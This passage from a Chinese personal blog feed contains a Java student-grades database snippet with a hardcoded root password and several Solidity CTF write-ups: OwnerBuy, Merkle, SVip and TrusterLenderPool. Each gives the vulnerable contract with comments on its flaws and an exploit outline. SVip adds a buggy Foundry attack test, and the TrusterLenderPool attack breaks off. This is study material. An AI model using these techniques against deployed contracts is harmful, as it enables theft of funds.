&quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement();</span><br><span class="line">                 ResultSet rs = stmt.executeQuery(&quot;SELECT stuid2, name, math, English, MaYuan, linemath FROM studentgrade&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    String studentId = rs.getString(&quot;stuid2&quot;);</span><br><span class="line">                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                    int mathScore = rs.getInt(&quot;math&quot;);</span><br><span class="line">                    int englishScore = rs.getInt(&quot;English&quot;);</span><br><span class="line">                    int maYuanScore = rs.getInt(&quot;MaYuan&quot;);</span><br><span class="line">                    int lineMathScore = rs.getInt(&quot;linemath&quot;);</span><br><span class="line">                    model.addRow(new Object[]&#123;studentId, name, mathScore, englishScore, maYuanScore, lineMathScore&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JTable table = new JTable(model);</span><br><span class="line">        JScrollPane scrollPane = new JScrollPane(table);</span><br><span class="line">        JOptionPane.showMessageDialog(this, scrollPane, &quot;学生成绩报表&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void generateUserReport() &#123;</span><br><span class="line">        String[] columnNames = &#123;&quot;学生ID&quot;, &quot;姓名&quot;, &quot;电话&quot;, &quot;QQ邮箱&quot;, &quot;班级编号&quot;&#125;;</span><br><span class="line">        DefaultTableModel model = new DefaultTableModel(columnNames, 0);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement();</span><br><span class="line">                 ResultSet rs = stmt.executeQuery(&quot;SELECT stuid1, name, telenumber, qqmail, classnumber FROM student&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    String studentId = rs.getString(&quot;stuid1&quot;);</span><br><span class="line">                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                    String telephone = rs.getString(&quot;telenumber&quot;);</span><br><span class="line">                    String qqMail = rs.getString(&quot;qqmail&quot;);</span><br><span class="line">                    String classNumber = rs.getString(&quot;classnumber&quot;);</span><br><span class="line">                    model.addRow(new Object[]&#123;studentId, name, telephone, qqMail, classNumber&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JTable table = new JTable(model);</span><br><span class="line">        JScrollPane scrollPane = new JScrollPane(table);</span><br><span class="line">        JOptionPane.showMessageDialog(this, scrollPane, &quot;用户列表报表&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-OwnerBuy</title>
      <link href="/2024/11/30/CTF-OwnerBuy/"/>
      <url>/2024/11/30/CTF-OwnerBuy/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-OwnerBuy"><a href="#CTF-OwnerBuy" class="headerlink" title="CTF-OwnerBuy"></a>CTF-OwnerBuy</h1><p>题目源码有很多文件。就看一个最关键的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 0.5.1-c8a2</span><br><span class="line">// Enable optimization</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">import &quot;./contracts/ERC20.sol&quot;;</span><br><span class="line">import &quot;./contracts/IERC20.sol&quot;;</span><br><span class="line">import &quot;./contracts/ERC20Detailed.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface Changing &#123;</span><br><span class="line">    function isOwner(address) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address public _owner;</span><br><span class="line">    address public _previousOwner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(</span><br><span class="line">        address indexed previousOwner,</span><br><span class="line">        address indexed newOwner</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Initializes the contract setting the deployer as the initial owner.</span><br><span class="line">     */</span><br><span class="line">    constructor() internal &#123;</span><br><span class="line">        address msgSender = msg.sender;</span><br><span class="line">        _owner = msgSender;</span><br><span class="line">        emit OwnershipTransferred(address(0), msgSender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the address of the current owner.</span><br><span class="line">     */</span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Throws if called by any account other than the owner.</span><br><span class="line">     */</span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(_owner == msg.sender, &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Leaves the contract without owner. It will not be possible to call</span><br><span class="line">     * `onlyOwner` functions anymore. Can only be called by the current owner.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: Renouncing ownership will leave the contract without an owner,</span><br><span class="line">     * thereby removing any functionality that is only available to the owner.</span><br><span class="line">     */</span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Transfers ownership of the contract to a new account (`newOwner`).</span><br><span class="line">     * Can only be called by the current owner.</span><br><span class="line">     */</span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            newOwner != address(0),</span><br><span class="line">            &quot;Ownable: new owner is the zero address&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Locks the contract for owner for the amount of time provided</span><br><span class="line">    function lock() public onlyOwner &#123;</span><br><span class="line">        _previousOwner = _owner;</span><br><span class="line">        _owner = address(0);</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Unlocks the contract for owner when _lockTime is exceeds</span><br><span class="line">    function unlock() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        emit OwnershipTransferred(_owner, _previousOwner);</span><br><span class="line">        _owner = _previousOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract OwnerBuy is Ownable, ERC20, ERC20Detailed &#123;</span><br><span class="line">    mapping(address =&gt; bool) public status;</span><br><span class="line">    mapping(address =&gt; uint256) public Times;</span><br><span class="line">    mapping(address =&gt; bool) internal whiteList;</span><br><span class="line">    uint256 MAXHOLD = 100;</span><br><span class="line"></span><br><span class="line">    event finished(bool);</span><br><span class="line"></span><br><span class="line">    constructor() public ERC20Detailed(&quot;DEMO&quot;, &quot;DEMO&quot;, 18) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 查看是否位于白名单中</span><br><span class="line">    function isWhite(address addr) public view returns (bool) &#123;</span><br><span class="line">        return whiteList[addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 只有owner才能设置白名单</span><br><span class="line">    function setWhite(address addr) external onlyOwner returns (bool) &#123;</span><br><span class="line">        whiteList[addr] = true;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 只有owner才能设置白名单</span><br><span class="line">    function unsetWhite(address addr) external onlyOwner returns (bool) &#123;</span><br><span class="line">        whiteList[addr] = false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 转账</span><br><span class="line">    function _transfer(address sender, address recipient, uint256 amount) internal &#123;</span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount);</span><br><span class="line">        _balances[recipient] = _balances[recipient].add(amount);</span><br><span class="line">        // 如果接收者不是白名单的用户，那么该用户最多拥有金额MAXHOLD</span><br><span class="line">        if (!isWhite(recipient)) &#123;</span><br><span class="line">            require(_balances[recipient] &lt;= MAXHOLD, &quot;hold overflow&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 如果调用者是合约，则它可以设置自己的状态</span><br><span class="line">    function changestatus(address _owner) public &#123;</span><br><span class="line">        Changing tmp = Changing(msg.sender);</span><br><span class="line">        if (!tmp.isOwner(_owner)) &#123;</span><br><span class="line">            status[msg.sender] = tmp.isOwner(_owner);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 更改owner</span><br><span class="line">    function changeOwner() public &#123;</span><br><span class="line">        // 需要用合约</span><br><span class="line">        require(tx.origin != msg.sender);</span><br><span class="line">        // 调用者地址的低2字节为ffff</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff == 0xffff);</span><br><span class="line">        // 需要合约已经设置状态为true</span><br><span class="line">        if (status[msg.sender] == true) &#123;</span><br><span class="line">            status[msg.sender] = false;</span><br><span class="line">            _owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 购买</span><br><span class="line">    function buy() public payable returns (bool success) &#123;</span><br><span class="line">        //只有_owner为 0x220866B1A2219f40e72f5c628B65D54268cA3A9D 才能调用</span><br><span class="line">        require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D);</span><br><span class="line">        // 要用合约买</span><br><span class="line">        require(tx.origin != msg.sender);</span><br><span class="line">        require(Times[msg.sender] == 0);</span><br><span class="line">        // msg.sender没钱</span><br><span class="line">        require(_balances[msg.sender] == 0);</span><br><span class="line">        // 要发1 wei</span><br><span class="line">        require(msg.value == 1 wei);</span><br><span class="line">        // 得到100</span><br><span class="line">        _balances[msg.sender] = 100;</span><br><span class="line">        // 记录</span><br><span class="line">        Times[msg.sender] = 1;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 很明显的重入</span><br><span class="line">    function sell(uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">        // 至少卖200</span><br><span class="line">        require(_amount &gt;= 200);</span><br><span class="line">        // 调用者地址的低2字节为ffff</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff == 0xffff);</span><br><span class="line">        // 必须调用buy之后</span><br><span class="line">        require(Times[msg.sender] &gt; 0);</span><br><span class="line">        // 足够的余额</span><br><span class="line">        require(_balances[msg.sender] &gt;= _amount);</span><br><span class="line">        // 足够的余额</span><br><span class="line">        require(address(this).balance &gt;= _amount);</span><br><span class="line">        msg.sender.call.gas(1000000)(&quot;&quot;);</span><br><span class="line">        _transfer(msg.sender, address(this), _amount); // 这个有安全库保护，因此余额无法下溢</span><br><span class="line">        Times[msg.sender] -= 1; // 这个可以下溢</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任务是Times至少100</span><br><span class="line">    function finish() public onlyOwner returns (bool) &#123;</span><br><span class="line">        require(Times[msg.sender] &gt;= 100);</span><br><span class="line">        Times[msg.sender] = 0;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">        emit finished(true);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从finish() 函数可以看见要求，</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Merkle</title>
      <link href="/2024/11/30/CTF-Merkle/"/>
      <url>/2024/11/30/CTF-Merkle/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Merkle"><a href="#CTF-Merkle" class="headerlink" title="CTF-Merkle"></a>CTF-Merkle</h1><p>题目原代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">library MerkleProof &#123;</span><br><span class="line">   </span><br><span class="line">    function verify( bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) &#123;</span><br><span class="line">        return processProof(proof, leaf) == root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 computedHash = leaf;</span><br><span class="line">        for (uint256 i = 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">            bytes32 proofElement = proof[i];</span><br><span class="line">            if (computedHash &lt;= proofElement) &#123;</span><br><span class="line">                // Hash(current computed hash + current element of the proof)</span><br><span class="line">                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // Hash(current element of the proof + current computed hash)</span><br><span class="line">                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return computedHash;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Merkle &#123;</span><br><span class="line">    </span><br><span class="line">    uint public amount = 1;</span><br><span class="line">    address public owner;</span><br><span class="line">    bytes20 mask = hex&quot;ff00000000000000000000000000000000000000&quot;;</span><br><span class="line">    bytes32 public merkleRoot;</span><br><span class="line">    </span><br><span class="line">    // 一开始合约有1ether</span><br><span class="line">    constructor(bytes32 root) payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        owner =  msg.sender;</span><br><span class="line">        merkleRoot = root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 只要调用者地址的第一个高字节和owner一样即可</span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(mask &amp; bytes20(msg.sender) == mask &amp; bytes20(owner));</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取a，b两个值的大值</span><br><span class="line">    function min(uint a,uint b) public view returns(uint)&#123;</span><br><span class="line">        return a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 取钱：需要通过merkle树验证，可以发给任何地址，一次最多取1wei</span><br><span class="line">    function withdraw(bytes32[] memory proof,address to) public returns(bool)&#123;</span><br><span class="line">        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));</span><br><span class="line">        require(MerkleProof.verify(proof, merkleRoot, leaf), &quot;Merkle Proof Verification failed&quot;);</span><br><span class="line">        uint balance = address(this).balance;</span><br><span class="line">        // 这里的amount没啥用，因为balnace一定是大于amount的，将本合约中的所有钱给到to地址</span><br><span class="line">        payable(to).transfer(min(amount,balance));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf() public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setMerkleroot(bytes32 _merkleroot) external onlyOwner &#123; </span><br><span class="line">        merkleRoot = _merkleroot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任务是将合约中的余额归零</span><br><span class="line">    function Complete() external &#123;</span><br><span class="line">        require(address(this).balance == 0);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求让合约的余额变为零</p><blockquote><p>这里先扩展一下，&amp;，|，^,~,的操作，都是比较二进制<br>&amp;：俩个数相同为1，不同为0<br>|:俩个数只少有一个为1，就为1.<br>^:俩个不同就为1，俩个相同就为0.<br>~：全部变为相反的数字</p></blockquote><p>这个题的思路就很简单，就是要将自己成为白名单上的，然后就可以更改root，调用withdraw函数，撤回所有的资金，然后用create2来创建合约地址就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SVip</title>
      <link href="/2024/11/30/CTF-SVip/"/>
      <url>/2024/11/30/CTF-SVip/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SVip"><a href="#CTF-SVip" class="headerlink" title="CTF-SVip"></a>CTF-SVip</h1><p>首先先看题目代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// pragma solidity 0.4.24; //这是原来的版本，很奇怪不知道为啥无法在foundry编译，所以换成以下版本</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract SVip &#123;</span><br><span class="line">    // 一个地址记录一个分数</span><br><span class="line">    mapping(address =&gt; uint) public points;</span><br><span class="line">    // 查看某地址是不是超级VIP</span><br><span class="line">    mapping(address =&gt; bool) public isSuperVip;</span><br><span class="line">    uint256 public numOfFree;</span><br><span class="line"></span><br><span class="line">    // 用户成为超级VIP需要999分数</span><br><span class="line">    function promotionSVip() public &#123;</span><br><span class="line">        require(points[msg.sender] &gt;= 999, &quot;Sorry, you don&#x27;t have enough points&quot;);</span><br><span class="line">        isSuperVip[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 领取免费分数，所有人领取的分数加起来不得等于100</span><br><span class="line">    function getPoint() public&#123;</span><br><span class="line">        require(numOfFree &lt; 100);</span><br><span class="line">        points[msg.sender] += 1;</span><br><span class="line">        numOfFree++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 送分，明显是存在发给自己这种漏洞情况</span><br><span class="line">    function transferPoints(address to, uint256 amount) public &#123;</span><br><span class="line">        uint256 tempSender = points[msg.sender];</span><br><span class="line">        uint256 tempTo = points[to];</span><br><span class="line">        require(tempSender &gt; amount);</span><br><span class="line">        require(tempTo + amount &gt; amount);</span><br><span class="line">        points[msg.sender] = tempSender - amount;</span><br><span class="line">        points[to] = tempTo + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任务是成为超级VIP</span><br><span class="line">    function isComplete() public view  returns(bool) &#123;</span><br><span class="line">        require(isSuperVip[msg.sender]);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然免费领取的分数有100的上限，但是有个途径可以让我们有增加分数的机会，就是在transferPoints函数中，就存在一个自我的转账的机会，让自己的分数增加，（由于我克隆的仓库出现了网络的问题，所以不能 实现一个复现了）</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragam solidity^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;</span><br><span class="line">import &quot;src/SVip.sol&quot;</span><br><span class="line"></span><br><span class="line">contract hack is test&#123;</span><br><span class="line">    SVip svip;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        svip = new SVip();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_SVip() public &#123;</span><br><span class="line">        //首先领取分数</span><br><span class="line">        for (int i = 0; i&lt;20;i++)</span><br><span class="line">        svip.getPoint();</span><br><span class="line"></span><br><span class="line">        //通过自我转账来实现分数的999,因为转账一次翻俩倍</span><br><span class="line">        //20-&gt;40-&gt;80-&gt;160-&gt;320-&gt;640-&gt;1280</span><br><span class="line">        for(int i = 0; i&lt; 6;i++ )</span><br><span class="line">        svip.tranferPoint(address(this),points(address(this)));</span><br><span class="line"></span><br><span class="line">        svip.promotionSVip();</span><br><span class="line">        assert(svip.isComplete(),ture);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的可以解决了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-TrusterLenderPool</title>
      <link href="/2024/11/30/CTF-TrusterLenderPool/"/>
      <url>/2024/11/30/CTF-TrusterLenderPool/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-TrusterLenderPool"><a href="#CTF-TrusterLenderPool" class="headerlink" title="CTF-TrusterLenderPool"></a>CTF-TrusterLenderPool</h1><p>这个题很经典。又是假装还款的存在</p><p>有用到swap交换，而且还是address(this)来检查token0的地址，所以就更加可以用来假装还款了</p><p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Cert is IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 预挖给msg.sender 1000个代币</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        _mint(msg.sender, 10000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 特定地址和admin啥也不做，否则</span><br><span class="line">    modifier safeCheek(address spender, uint256 amount) &#123;</span><br><span class="line">        if (uint160(tx.origin) &amp; 0xffffff != 0xbeddC4 || tx.origin == admin) &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            grant(spender, amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将第amount个slot的值设置为tx.origin</span><br><span class="line">    function grant(address spender, uint256 amount) internal &#123;</span><br><span class="line">        // spender必须是一个合约，并且代码长度得小于10，长度限制挺苛刻的</span><br><span class="line">        require(spender.code.length &gt; 0 &amp;&amp; spender.code.length &lt; 10);</span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        bytes32 slot = bytes32(amount);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public safeCheek(spender,amount) returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _spendAllowance(from, msg.sender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer( address from, address to, uint256 amount) internal &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve( address owner, address spender,  uint256 amount) internal &#123;</span><br><span class="line">        if(tx.origin==admin)&#123;</span><br><span class="line">            require(msg.sender.code.length&gt;0);</span><br><span class="line">            _allowances[spender][tx.origin] = amount;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance( address owner, address spender, uint256 amount) internal &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable token0;</span><br><span class="line">    IERC20 public immutable token1;</span><br><span class="line"></span><br><span class="line">    // 创建了两个Cert，然后赋值给token0和token1，本合约拥有token0和token1各10000个</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        token0 = new Cert();</span><br><span class="line">        token1 = new Cert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 交换token0和token1，使用之前需要先授权给本合约，这里是等额交换，也就是加减法交换</span><br><span class="line">    function swap(address tokenAddress, uint amount) public returns(uint)&#123;</span><br><span class="line">        require(</span><br><span class="line">            // 以 || 为界限，必须上边都为true或下边都为true</span><br><span class="line">            tokenAddress == address(token0) &amp;&amp; token1.transferFrom(msg.sender,address(this),amount)  &amp;&amp; token0.transfer(msg.sender,amount) </span><br><span class="line">            </span><br><span class="line">            ||</span><br><span class="line"></span><br><span class="line">            tokenAddress== address(token1) &amp;&amp; token0.transferFrom(msg.sender,address(this),amount) &amp;&amp; token1.transfer(msg.sender,amount));</span><br><span class="line">        return amount;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // 闪电贷</span><br><span class="line">    function flashLoan(uint256 borrowAmount,address borrower) external nonReentrant&#123;</span><br><span class="line">        // 获取闪电贷之前token0的余额</span><br><span class="line">        uint256 balanceBefore = token0.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        // 借给borrower，可以是任意地址</span><br><span class="line">        token0.transfer(borrower, borrowAmount);</span><br><span class="line">        // 回调borrower的receiveEther(uint256)进行还钱</span><br><span class="line">        borrower.functionCall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveEther(uint256)&quot;,</span><br><span class="line">                borrowAmount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 检查token0余额，必须大于等于之前的余额</span><br><span class="line">        uint256 balanceAfter = token0.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 本关目标：将token0余额设置为0</span><br><span class="line">    function Complete() external &#123;</span><br><span class="line">        require(token0.balanceOf(address(this)) == 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和之前的一个整理的例子很想，都是讲token变为零</p><p> 那么测试合约<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragam solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;</span><br><span class="line">import &quot;src/TrusterLenderPool.sol&quot;</span><br><span class="line"></span><br><span class="line">contract attack is Test&#123;</span><br><span 